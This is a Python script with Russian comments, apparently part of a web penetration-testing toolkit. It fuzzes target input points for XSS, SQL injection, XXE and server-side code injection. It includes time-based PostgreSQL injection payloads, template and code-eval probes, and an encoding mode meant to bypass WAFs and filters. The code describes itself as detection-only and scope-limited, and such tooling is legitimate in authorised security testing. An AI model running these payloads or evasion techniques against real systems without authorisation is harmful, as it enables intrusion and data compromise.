#!/usr/bin/env python3
"""
03 — Активный фаззинг точек ввода (детектирующий, без деструктива).

Читает targets.json и по каждой точке ввода гоняет payload'ы из словарей
wordlists/. Для каждой категории — своя эвристика детекта:

  xss   — отражение уникального маркера в ОПАСНОМ контексте (неэкранированные
          < > " '), т.е. признак, что ввод попадает в HTML как разметка.
  sqli  — (а) сигнатуры ошибок СУБД в ответе (error-based);
          (б) слепой тайминг: benign `WAITFOR DELAY` для MS SQL заметно
          увеличивает время ответа относительно базлайна.
  xml   — сигнатуры ошибок XML-парсера / XQuery при подаче битого XML и
          безопасных XXE-проб (без реального вытягивания файлов — только
          факт, что внешняя сущность обрабатывается).
  code  — серверный JS (SSJS Websoft HCM) / выражения: подаём выражение,
          результат которого уникален (напр. 73*73), и ищем это число в
          ответе; плюс benign sleep для слепого детекта по таймингу.

Маркер WSMARK в словарях заменяется на случайный токен на каждый запрос —
так отражение обнаруживается точно и без ложных совпадений.

Все находки = КАНДИДАТЫ. Подтверждать вручную (реплей через Burp — выставьте
PROXY в config.py).

Обход регулярок/WAF: флаг --mutations разворачивает каждый payload в набор
кодированных/обфусцированных представлений (см. encoders.py). Если находка
проходит только через не-raw кодировку — это и есть вектор обхода фильтра.

Запуск:
  python 03_fuzzer.py --categories xss,sqli,xml,code
  python 03_fuzzer.py --categories sqli --max-targets 50
  python 03_fuzzer.py --categories xss,sqli --mutations
  python 03_fuzzer.py --categories sqli --mutations --encoders sql_comment_spaces,double_url
"""
import argparse
import html as html_mod
import json
import random
import re
import string
import sys
import threading
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from copy import deepcopy
from urllib.parse import urlparse, parse_qsl, urlencode, urlunparse, unquote

import requests

try:
    import config
except ImportError:
    sys.exit("Нет config.py — скопируйте config.example.py в config.py и заполните.")

import encoders   # слой кодирования/обфускации для обхода регулярок и WAF

MARKER_PLACEHOLDER = "WSMARK"

# --- Сигнатуры ошибок СУБД (error-based SQLi), с упором на PostgreSQL --------
SQL_ERROR_SIGNS = [
    r"PostgreSQL", r"PSQLException", r"org\.postgresql",
    r"syntax error at or near", r"unterminated quoted string",
    r"invalid input syntax for", r"operator does not exist",
    r"relation \".*\" does not exist", r"column \".*\" does not exist",
    r"ERROR:\s.*\bat character\b", r"pg_query", r"PG::\w+Error",
    r"SQLSTATE\[", r"could not determine data type",
    r"function .* does not exist",
]
# Сигнатуры ошибок XML/XQuery парсера
XML_ERROR_SIGNS = [
    r"XmlException", r"System\.Xml", r"premature end of data",
    r"not well-formed", r"xmlParseEntityRef", r"DOCTYPE is not allowed",
    r"error parsing attribute name", r"EntityRef", r"XQueryException",
    r"XQST\d{4}", r"XPST\d{4}", r"Invalid XML", r"unexpected end of file",
]
# Сигнатуры серверных ошибок исполнения JS/скрипта (SSJS/движок WebTutor)
CODE_ERROR_SIGNS = [
    r"SyntaxError", r"ReferenceError", r"TypeError", r"is not defined",
    r"unexpected token", r"eval", r"ScriptException", r"Microsoft JScript",
    r"VBScript", r"Server\.CreateObject",
]

_lock = threading.Lock()


def rand_marker():
    return "wm" + "".join(random.choices(string.ascii_lowercase + string.digits, k=8))


def build_session():
    s = requests.Session()
    s.headers.update({
        "Authorization": f"Bearer {config.BEARER_TOKEN}",
        "User-Agent": config.USER_AGENT,
        "Accept": "*/*",
    })
    s.headers.update(getattr(config, "EXTRA_HEADERS", {}) or {})
    s.verify = config.VERIFY_TLS
    if config.PROXY:
        s.proxies = {"http": config.PROXY, "https": config.PROXY}
    return s


def load_payloads(path):
    out = []
    try:
        with open(path, encoding="utf-8") as f:
            for line in f:
                line = line.rstrip("\n")
                if line and not line.startswith("#"):
                    out.append(line)
    except FileNotFoundError:
        print(f"  [!] нет словаря {path}")
    return out


# --- Инъекция значения в нужную точку запроса -------------------------------
def inject_request(target, value):
    """Собирает (method, url, params, data, json_body) с подставленным value."""
    url = target["url"]
    method = target["method"].upper()
    loc = target["location"]
    param = target["param"]

    parsed = urlparse(url)
    query = dict(parse_qsl(parsed.query, keep_blank_values=True))
    data = None
    json_body = None

    if loc == "query":
        query[param] = value
        new = parsed._replace(query=urlencode(query, doseq=True))
        url = urlunparse(new)
    elif loc == "form":
        if method == "GET":
            query[param] = value
            url = urlunparse(parsed._replace(query=urlencode(query, doseq=True)))
        else:
            data = {param: value}
    elif loc == "json":
        json_body = {param: value}
        method = method if method in ("POST", "PUT", "PATCH") else "POST"
    elif loc == "path":
        url = url.replace("{" + param + "}", value)
    elif loc == "header":
        return method, url, query, data, json_body, {param: value}
    else:
        query[param] = value
        url = urlunparse(parsed._replace(query=urlencode(query, doseq=True)))

    return method, url, query, data, json_body, {}


def send(session, target, value):
    method, url, _, data, json_body, extra_headers = inject_request(target, value)
    time.sleep(config.REQUEST_DELAY)
    t0 = time.monotonic()
    try:
        r = session.request(
            method, url,
            data=data, json=json_body,
            headers=extra_headers or None,
            timeout=config.TIMEOUT, allow_redirects=False,
        )
        elapsed = time.monotonic() - t0
        return r, elapsed
    except requests.RequestException:
        return None, time.monotonic() - t0


def matches_any(text, patterns):
    for p in patterns:
        if re.search(p, text, re.IGNORECASE):
            return p
    return None


# --- Детекторы по категориям ------------------------------------------------
def detect_xss(resp, marker):
    """
    Маркер отражён в опасном контексте (есть неэкранированные символы).

    Устойчиво к кодированию: ищем маркер и в сыром теле, и в разэкранированном
    (HTML-сущности + URL-декод), регистронезависимо. Это важно при фаззинге
    обфусцированными вариантами — сервер часто декодирует payload, и в ответ
    попадает уже «чистый» маркер.
    """
    for body in (resp.text, html_mod.unescape(resp.text), _safe_unquote(resp.text)):
        low = body.lower()
        pos = low.find(marker.lower())
        if pos == -1:
            continue
        window = body[max(0, pos - 40): pos + 40]
        if any(ch in window for ch in ("<", ">", "\"", "'")):
            return f"маркер отражён без экранирования: …{window}…"
    return None


def _safe_unquote(s):
    try:
        return unquote(s)
    except Exception:
        return s


def detect_sqli_error(resp):
    sign = matches_any(resp.text, SQL_ERROR_SIGNS)
    return f"ошибка СУБД: {sign}" if sign else None


def detect_xml_error(resp):
    sign = matches_any(resp.text, XML_ERROR_SIGNS)
    return f"ошибка XML/XQuery: {sign}" if sign else None


def detect_code(resp, expect_token):
    if expect_token and expect_token in resp.text:
        return f"серверное вычисление выражения: найден {expect_token}"
    sign = matches_any(resp.text, CODE_ERROR_SIGNS)
    return f"ошибка интерпретатора: {sign}" if sign else None


def time_based_check(session, target, payload_tpl, baseline, cat,
                     mutations=False, enc_names=None, threshold=4.0):
    """
    Слепой тайминг. payload_tpl содержит {SEC}. Шлём с задержкой N и 0,
    подтверждаем, если задержка воспроизводимо отражается во времени ответа.

    Кодирование применяется ПОСЛЕ подстановки {SEC} (иначе плейсхолдер
    сломается). При mutations=True перебираем и обфусцированные представления —
    так ловим слепую инъекцию даже за WAF/регуляркой.

    Возвращает (имя_кодировки, описание) при срабатывании или None.
    """
    delay = 6
    slow_raw = payload_tpl.replace("{SEC}", str(delay))
    fast_raw = payload_tpl.replace("{SEC}", "0")

    if mutations:
        slow_variants = encoders.mutate(slow_raw, cat, enc_names)
        fast_map = dict(encoders.mutate(fast_raw, cat, enc_names))
        combos = [(name, s, fast_map.get(name, fast_raw)) for name, s in slow_variants]
    else:
        combos = [("raw", slow_raw, fast_raw)]

    for enc_name, slow_payload, fast_payload in combos:
        r1, t_slow = send(session, target, slow_payload)
        r2, t_fast = send(session, target, fast_payload)
        if r1 is None or r2 is None:
            continue
        # Медленный ответ должен быть ощутимо дольше быстрого И базлайна.
        if t_slow - max(t_fast, baseline) >= threshold and t_slow >= delay - 1:
            return (enc_name,
                    f"слепой тайминг: Δ={t_slow - t_fast:.1f}s на задержке {delay}s")
    return None


# --- Тайминговые шаблоны (нужна логика, поэтому заданы в коде) ---------------
TIME_PAYLOADS = {
    "sqli": [
        # PostgreSQL: pg_sleep в разных контекстах (строка, число, stacked)
        "1' AND (SELECT 1 FROM pg_sleep({SEC}))--",
        "1' AND 1=(SELECT 1 FROM pg_sleep({SEC}))--",
        "' || (SELECT pg_sleep({SEC})) || '",
        "1);SELECT pg_sleep({SEC})--",
        "1 AND (SELECT 1 FROM pg_sleep({SEC}))",
    ],
    "code": [
        # benign: серверный sleep в SSJS-окружении; деструктива нет
        "';(function(){var e=Date.now()+{SEC}000;while(Date.now()<e){}})();'",
    ],
}
# Шаблоны для code — уникальное арифметическое выражение
CODE_EVAL_PAYLOADS = [
    "${73*73}", "{{73*73}}", "'+73*73+'", "\";73*73;//", "`${73*73}`",
]
CODE_EVAL_EXPECT = "5329"   # 73*73


def fuzz_target(session, target, categories, payloads, mutations, enc_names):
    findings = []
    base_r, base_t = send(session, target, rand_marker())
    baseline = base_t if base_r is not None else 0.5

    label = f'{target["method"]} {target["url"]} [{target["location"]}:{target["param"]}]'

    def variants_of(value, cat):
        """raw + обфусцированные представления (если включены мутации)."""
        if not mutations:
            return [("raw", value)]
        return encoders.mutate(value, cat, enc_names)

    # --- отражающие / error-based из словарей ---
    for cat in categories:
        for raw in payloads.get(cat, []):
            marker = rand_marker()
            value = raw.replace(MARKER_PLACEHOLDER, marker)
            for enc_name, variant in variants_of(value, cat):
                resp, _ = send(session, target, variant)
                if resp is None:
                    continue
                ev = None
                if cat == "xss":
                    ev = detect_xss(resp, marker)
                elif cat == "sqli":
                    ev = detect_sqli_error(resp)
                elif cat == "xml":
                    ev = detect_xml_error(resp)
                elif cat == "code":
                    ev = detect_code(resp, None)
                if ev:
                    findings.append({**_hit(target, cat, variant, resp),
                                     "encoding": enc_name, "evidence": ev})
                    tag = cat if enc_name == "raw" else f"{cat}/{enc_name}"
                    print(f"  [HIT:{tag}] {label}  <- {variant[:60]}")

    # --- code: детект серверного вычисления выражения ---
    if "code" in categories:
        for payload in CODE_EVAL_PAYLOADS:
            for enc_name, variant in variants_of(payload, "code"):
                resp, _ = send(session, target, variant)
                if resp is None:
                    continue
                ev = detect_code(resp, CODE_EVAL_EXPECT)
                if ev:
                    findings.append({**_hit(target, "code", variant, resp),
                                     "encoding": enc_name, "evidence": ev})
                    tag = "code" if enc_name == "raw" else f"code/{enc_name}"
                    print(f"  [HIT:{tag}] {label}  <- {variant}")

    # --- слепой тайминг (sqli, code) ---
    for cat in ("sqli", "code"):
        if cat in categories:
            done = False
            for tpl in TIME_PAYLOADS[cat]:
                res = time_based_check(session, target, tpl, baseline, cat,
                                       mutations=mutations, enc_names=enc_names)
                if res:
                    enc_name, ev = res
                    findings.append({**_hit(target, cat + "-blind", tpl, None),
                                     "encoding": enc_name, "evidence": ev})
                    tag = f"{cat}-blind" if enc_name == "raw" else f"{cat}-blind/{enc_name}"
                    print(f"  [HIT:{tag}] {label}  <- {tpl}")
                    done = True
                    break   # одного подтверждённого тайминга на точку достаточно
            if done:
                continue
    return findings


def _hit(target, cat, payload, resp):
    return {
        "category": cat,
        "url": target["url"],
        "method": target["method"],
        "param": target["param"],
        "location": target["location"],
        "payload": payload,
        "status": resp.status_code if resp is not None else None,
        "resp_len": len(resp.content) if resp is not None else None,
    }


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--categories", default="xss,sqli,xml,code",
                    help="через запятую: xss,sqli,xml,code")
    ap.add_argument("--max-targets", type=int, default=0,
                    help="ограничить число точек (0 = все)")
    ap.add_argument("--mutations", action="store_true",
                    help="прогонять каждый payload в кодированных/обфусцированных "
                         "вариантах (обход регулярок и WAF)")
    ap.add_argument("--encoders", default="",
                    help="через запятую — какие именно мутаторы применять "
                         "(по умолчанию все для категории). "
                         "Список см.: python encoders.py")
    args = ap.parse_args()
    categories = [c.strip() for c in args.categories.split(",") if c.strip()]
    enc_names = [e.strip() for e in args.encoders.split(",") if e.strip()] or None

    payloads = {
        "xss": load_payloads("wordlists/xss_payloads.txt"),
        "sqli": load_payloads("wordlists/sqli_payloads.txt"),
        "xml": load_payloads("wordlists/xml_payloads.txt"),
        "code": load_payloads("wordlists/code_injection_payloads.txt"),
    }

    with open(config.TARGETS_FILE, encoding="utf-8") as f:
        targets = json.load(f)
    # Не фаззим то, что явно вне scope / в deny-листе.
    targets = [t for t in targets
               if not any(b in t["url"].lower() for b in config.DENY_SUBSTRINGS)]
    if args.max_targets:
        targets = targets[:args.max_targets]

    mut_note = "ВКЛ" if args.mutations else "выкл"
    print(f"[*] Точек: {len(targets)} | категории: {', '.join(categories)} "
          f"| потоки: {config.CONCURRENCY} | обфускация: {mut_note}")
    if args.mutations:
        print(f"    мутаторы: {', '.join(enc_names) if enc_names else 'все для категории'}")

    all_findings = []
    with ThreadPoolExecutor(max_workers=config.CONCURRENCY) as pool:
        futs = {pool.submit(fuzz_target, build_session(), t, categories, payloads,
                            args.mutations, enc_names): t
                for t in targets}
        for fut in as_completed(futs):
            try:
                all_findings.extend(fut.result())
            except Exception as e:
                print(f"  [!] ошибка на точке: {e}")

    with open(config.FINDINGS_FILE, "w", encoding="utf-8") as f:
        json.dump(all_findings, f, ensure_ascii=False, indent=2)

    by_cat, by_enc = {}, {}
    for fnd in all_findings:
        by_cat[fnd["category"]] = by_cat.get(fnd["category"], 0) + 1
        enc = fnd.get("encoding", "raw")
        by_enc[enc] = by_enc.get(enc, 0) + 1
    print(f"\n[✓] Находок-кандидатов: {len(all_findings)} -> {config.FINDINGS_FILE}")
    if by_cat:
        print("    по категориям: " + ", ".join(f"{k}={v}" for k, v in by_cat.items()))
    if args.mutations and by_enc:
        # Находки через НЕ-raw кодировку = фильтр/WAF обходится именно так.
        bypass = {k: v for k, v in by_enc.items() if k != "raw"}
        if bypass:
            print("    обход через кодировки: "
                  + ", ".join(f"{k}={v}" for k, v in bypass.items()))
    print("    Все находки подтверждайте вручную (реплей через Burp/ZAP).")


if __name__ == "__main__":
    main()
